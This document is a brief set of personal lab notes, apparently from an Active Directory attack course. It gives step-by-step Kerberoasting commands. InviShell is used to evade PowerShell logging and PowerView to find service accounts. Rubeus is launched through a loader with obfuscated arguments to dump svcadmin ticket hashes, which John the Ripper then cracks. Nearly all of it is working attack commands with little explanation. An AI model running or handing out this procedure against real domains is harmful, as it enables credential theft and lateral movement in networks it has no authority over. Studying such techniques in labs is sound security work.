[[Lateral Movement]]
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```
. C:\AD\Tools\PowerView.ps1
```
the command below only gets user accounts running as service accounts. because cracking machine account passwords is hell. therefore only target user accounts.
```
Get-DomainUser -SPN
```
now Kerberoast the ==SAMACCOUNTNAME==
```
ArgSplit.bat -> kerberoast
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
==now open hashes.txt and remove 1433==.
```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

